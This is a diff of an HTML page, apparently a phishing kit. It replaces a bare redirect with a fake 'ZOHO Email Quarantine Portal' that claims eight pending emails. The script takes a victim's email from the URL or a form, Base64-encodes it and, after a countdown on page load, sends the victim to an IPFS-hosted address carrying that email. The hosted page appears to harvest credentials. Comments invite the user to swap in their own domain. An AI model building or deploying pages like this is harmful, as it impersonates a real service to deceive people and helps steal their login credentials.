@@ -3,66 +3,456 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting securely...</title>
+    <title>ZOHO • Secure Access</title>
     <style>
-        body, html {
-            margin: 0; padding: 0; height: 100%; overflow: hidden;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: 'Segoe UI', sans-serif;
-            display: flex; align-items: center; justify-content: center;
-            color: white;
+        /* Modern Minimalist Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+            background: #fafafa;
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        /* ZOHO Logo Colors */
+        .z-red { color: #FF4D4D; }
+        .z-orange { color: #FFA500; }
+        .z-green { color: #4CAF50; }
+        .z-blue { color: #2196F3; }
+        
+        /* Main Container */
         .container {
+            max-width: 480px;
+            width: 100%;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            border: 1px solid #f0f0f0;
+        }
+        
+        /* Header with ZOHO Logo */
+        .header {
+            padding: 40px 40px 30px;
             text-align: center;
-            animation: pulse 2s infinite;
+            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+            border-bottom: 1px solid #f0f0f0;
         }
-        .spinner {
-            width: 50px; height: 50px;
-            border: 5px solid rgba(255,255,255,0.3);
-            border-top: 5px solid white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+        
+        .zoho-logo {
+            font-size: 48px;
+            font-weight: 800;
+            letter-spacing: -2px;
+            margin-bottom: 8px;
+            line-height: 1;
         }
-        h1 { font-size: 2rem; margin: 0 0 10px; }
-        p { margin: 5px; opacity: 0.9; font-size: 1rem; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        @keyframes pulse { 0%,100% { opacity: 0.8; } 50% { opacity: 1; } }
+        
+        .tagline {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        
+        /* Content Area */
+        .content {
+            padding: 40px;
+        }
+        
+        /* Status States */
+        .status-box {
+            padding: 30px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        
+        .processing {
+            background: #FFF9E6;
+            border: 1px solid #FFE066;
+        }
+        
+        .success {
+            background: #F0FFF4;
+            border: 1px solid #68D391;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .error {
+            background: #FFF5F5;
+            border: 1px solid #FC8181;
+        }
+        
+        /* User Email Display */
+        .user-email {
+            font-size: 20px;
+            font-weight: 600;
+            color: #2D3748;
+            background: #F7FAFC;
+            padding: 16px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 1px solid #E2E8F0;
+            font-family: 'SF Mono', Monaco, monospace;
+        }
+        
+        /* Countdown */
+        .countdown {
+            font-size: 32px;
+            font-weight: 700;
+            color: #2196F3;
+            margin: 20px 0;
+        }
+        
+        /* Progress Bar */
+        .progress-bar {
+            height: 4px;
+            background: #E2E8F0;
+            border-radius: 2px;
+            margin: 24px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #FF4D4D, #FFA500, #4CAF50, #2196F3);
+            width: 0%;
+            animation: progress 3s linear forwards;
+        }
+        
+        /* Redirect Info */
+        .redirect-info {
+            background: #F8F9FA;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 1px solid #E2E8F0;
+        }
+        
+        .redirect-url {
+            font-family: 'SF Mono', Monaco, monospace;
+            font-size: 13px;
+            color: #4A5568;
+            word-break: break-all;
+            background: white;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px dashed #CBD5E0;
+            margin: 10px 0;
+        }
+        
+        /* Action Button */
+        .action-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #2D3748;
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            margin-top: 16px;
+        }
+        
+        .action-btn:hover {
+            background: #4A5568;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* Manual Form */
+        .manual-form {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #E2E8F0;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #E2E8F0;
+            border-radius: 12px;
+            font-size: 16px;
+            margin-bottom: 16px;
+            transition: border-color 0.2s ease;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #2196F3;
+        }
+        
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes progress {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+        
+        /* Responsive */
+        @media (max-width: 480px) {
+            .content, .header {
+                padding: 30px 24px;
+            }
+            
+            .zoho-logo {
+                font-size: 40px;
+            }
+            
+            .user-email {
+                font-size: 16px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="spinner"></div>
-        <h1>loading held emails</h1>
-        <p>Please wait while we securely redirect you...</p>
+        <!-- Header with ZOHO Logo -->
+        <div class="header">
+            <div class="zoho-logo">
+                <span class="z-red">Z</span>
+                <span class="z-orange">O</span>
+                <span class="z-green">H</span>
+                <span class="z-blue">O</span>
+            </div>
+            <div class="tagline">Email Quarantine Portal</div>
+        </div>
+        
+        <!-- Content Area -->
+        <div class="content">
+            <!-- Processing State -->
+            <div id="processing" class="status-box processing">
+                <div style="font-size: 48px; margin-bottom: 16px;">🔒</div>
+                <h3 style="color: #D69E2E; margin-bottom: 8px;">Verifying Access</h3>
+                <p style="color: #744210;">Processing your secure credentials...</p>
+            </div>
+            
+            <!-- Success State -->
+            <div id="success" class="status-box success" style="display: none;">
+                <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
+                <h3 style="color: #276749; margin-bottom: 8px;">8 Pending emails found</h3>
+                <p style="color: #22543D;">Welcome to ZOHO Secure Portal</p>
+                
+                <div class="user-email" id="userEmail">Loading...</div>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+                
+                <div class="countdown" id="countdown">3</div>
+                <p style="color: #4A5568; margin-bottom: 16px;">
+                    Accessing pending emails in <span id="seconds">3</span> seconds
+                </p>
+                
+                <div class="redirect-info">
+                    <p style="font-weight: 600; color: #2D3748; margin-bottom: 8px;">Redirecting to:</p>
+                    <div class="redirect-url" id="redirectUrlPreview">
+                        Accessing secure redirect URL...
+                    </div>
+                    <p style="font-size: 14px; color: #718096; margin-top: 8px;">
+                        You will be redirected with your secure access token
+                    </p>
+                </div>
+                
+                <a href="#" id="manualRedirect" class="action-btn">
+                    ↗ Continue Now
+                </a>
+            </div>
+            
+            <!-- Error State -->
+            <div id="error" class="status-box error" style="display: none;">
+                <div style="font-size: 48px; margin-bottom: 16px;">⚠️</div>
+                <h3 style="color: #C53030; margin-bottom: 8px;">Access Required</h3>
+                <p id="errorMessage" style="color: #742A2A; margin-bottom: 16px;"></p>
+                
+                <div class="manual-form">
+                    <input type="email" id="manualEmail" class="form-input" placeholder="Enter your ZOHO email address">
+                    <button onclick="processManualEmail()" class="action-btn" style="width: 100%;">
+                        Verify & Continue
+                    </button>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        (() => {
-            const params = new URLSearchParams(location.search);
-            const data = params.get('data');
-
-            if (!data?.trim()) {
-                document.body.innerHTML = '<div style="color:#fff; text-align:center; padding:50px; font-family:sans-serif;">Error: Missing data parameter.</div>';
-                return;
-            }
-
-            let decoded;
+        // CONFIGURATION - SET YOUR DOMAIN HERE
+        const YOUR_DOMAIN = "https://bafkreidx3drfxviyo7bb752llazn6gpmypwtgy6nj2zaa7ugq3r6rvvixi.ipfs.dweb.link/"; // ← CHANGE THIS TO YOUR ACTUAL DOMAIN
+        const REDIRECT_DELAY = 2; // seconds to show success message before redirect
+        
+        // Function to decode Base64
+        function decodeBase64(str) {
             try {
-                decoded = atob(data.trim());
+                return atob(str);
             } catch (e) {
-                document.body.innerHTML = '<div style="color:#ff6b6b; text-align:center; padding:50px; font-family:sans-serif;">Error: Invalid Base64 data.</div>';
+                console.error('Base64 decode error:', e);
+                return null;
+            }
+        }
+        
+        // Function to build the redirect URL to YOUR domain
+        function buildRedirectUrl(base64Email) {
+            // Format: https://YOURDOMAIN.com/?zoho.com&user=#Base64Email
+            // Note: This is an unusual format with query parameter containing .com
+            return `https://bafkreidx3drfxviyo7bb752llazn6gpmypwtgy6nj2zaa7ugq3r6rvvixi.ipfs.dweb.link?zoho.com&user=#${base64Email}`;
+        }
+        
+        // Function to start countdown and redirect
+        function startRedirectCountdown(base64Email, decodedEmail) {
+            let seconds = REDIRECT_DELAY;
+            const countdownEl = document.getElementById('countdown');
+            const secondsEl = document.getElementById('seconds');
+            const redirectUrl = buildRedirectUrl(base64Email);
+            
+            // Show the redirect URL preview
+            document.getElementById('redirectUrlPreview').textContent = redirectUrl;
+            
+            // Update countdown display
+            const countdownInterval = setInterval(() => {
+                seconds--;
+                countdownEl.textContent = seconds;
+                secondsEl.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    performRedirect(redirectUrl);
+                }
+            }, 1000);
+            
+            // Setup manual redirect link
+            document.getElementById('manualRedirect').addEventListener('click', function(e) {
+                e.preventDefault();
+                performRedirect(redirectUrl);
+            });
+            
+            // Auto-redirect after delay
+            setTimeout(() => {
+                clearInterval(countdownInterval);
+                performRedirect(redirectUrl);
+            }, REDIRECT_DELAY * 1000);
+        }
+        
+        // Function to perform the actual redirect
+        function performRedirect(redirectUrl) {
+            console.log('Redirecting to:', redirectUrl);
+            
+            // Direct redirect to your domain with the special format
+            window.location.href = redirectUrl;
+        }
+        
+        // Main processing function
+        function processAccess() {
+            // Get URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            let base64Email = urlParams.get('user');
+            const plainEmail = urlParams.get('e') || urlParams.get('email');
+            
+            // Hide processing message
+            document.getElementById('processing').style.display = 'none';
+            
+            // Case 1: Already have Base64 parameter
+            if (base64Email) {
+                const decodedEmail = decodeBase64(base64Email);
+                
+                if (decodedEmail) {
+                    // Show success
+                    document.getElementById('userEmail').textContent = decodedEmail;
+                    document.getElementById('success').style.display = 'block';
+                    
+                    console.log('User authenticated:', decodedEmail);
+                    console.log('Base64 token:', base64Email);
+                    
+                    // Start countdown and redirect
+                    startRedirectCountdown(base64Email, decodedEmail);
+                    
+                } else {
+                    // Base64 decode failed
+                    document.getElementById('errorMessage').textContent = 'Invalid access code. Please use your zoho email.';
+                    document.getElementById('error').style.display = 'block';
+                }
                 return;
             }
-
-            const redirectURL = `https://bafkreigca3vssukon6qbyv3vlfzgd5pe5mxqjuc2dr6fdltfywxgcqtd6y.ipfs.dweb.link?zoho.com&user=#${data}`;
-
-            // Instant redirect (fastest possible)
-            location.replace(redirectURL);
-
-            // Fallback in case replace fails (very rare)
-            setTimeout(() => location.href = redirectURL, 100);
-        })();
+            
+            // Case 2: Have plain email parameter (convert to Base64)
+            if (plainEmail) {
+                try {
+                    const email = plainEmail.trim().toLowerCase();
+                    base64Email = btoa(email);
+                    
+                    // Update URL without reloading page
+                    const newUrl = `${window.location.pathname}?user=${base64Email}`;
+                    window.history.replaceState({}, '', newUrl);
+                    
+                    // Show success with the email
+                    document.getElementById('userEmail').textContent = email;
+                    document.getElementById('success').style.display = 'block';
+                    
+                    console.log('Converted email to Base64:', base64Email);
+                    
+                    // Start countdown and redirect
+                    startRedirectCountdown(base64Email, email);
+                    
+                } catch (error) {
+                    document.getElementById('errorMessage').textContent = 'Could not process email. Please try again.';
+                    document.getElementById('error').style.display = 'block';
+                }
+                return;
+            }
+            
+            // Case 3: No parameters - show error
+            document.getElementById('errorMessage').textContent = 'Use your Zoho email to verify & access quarantined messages';
+            document.getElementById('error').style.display = 'block';
+        }
+        
+        // Manual email processing
+        function processManualEmail() {
+            const emailInput = document.getElementById('manualEmail');
+            const email = emailInput.value.trim();
+            
+            if (!email || !email.includes('@')) {
+                alert('Please enter a valid ZOHO email address');
+                return;
+            }
+            
+            try {
+                const base64Email = btoa(email.toLowerCase());
+                
+                // Update URL and reload
+                const newUrl = `${window.location.pathname}?user=${base64Email}`;
+                window.location.href = newUrl;
+                
+            } catch (error) {
+                document.getElementById('errorMessage').textContent = 'Error: ' + error.message;
+            }
+        }
+        
+        // Start processing when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Small delay to show processing message
+            setTimeout(processAccess, 1000);
+        });
     </script>
 </body>
 </html>
